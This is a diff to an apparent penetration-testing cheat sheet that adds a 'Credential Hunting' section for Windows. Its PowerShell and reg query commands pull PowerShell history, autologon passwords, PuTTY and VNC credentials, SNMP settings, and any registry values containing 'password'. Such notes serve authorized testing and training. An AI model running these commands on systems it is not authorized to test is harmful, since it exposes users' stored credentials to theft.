@@ -501,13 +501,48 @@ whoami /groups
 
 ### Get priviliges
 ```ps
-whoami /all
+whoami /priv
 ```
 
 </details>
 
 <details>
   <summary><strong>Credential Hunting</strong></summary>
+
+### Powershell Hisoty
+```ps
+Get-History
+```
+
+### Get path to consoleHost_history.txt
+```ps
+(Get-PSReadlineOption).HistorySavePath
+```
+
+reg query HKLM /f password /t REG_SZ /s
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+### Putty keys
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
+
+### VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"  
+reg query "HKCU\Software\TightVNC\Server"  
+
+### Windows autologin  
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
+
+### SNMP Parameters  
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  
+
+### Putty  
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  
+
+### Search for the password in the registry  
+reg query HKLM /f password /t REG_SZ /s  
+reg query HKCU /f password /t REG_SZ /s
   
 </details>
 
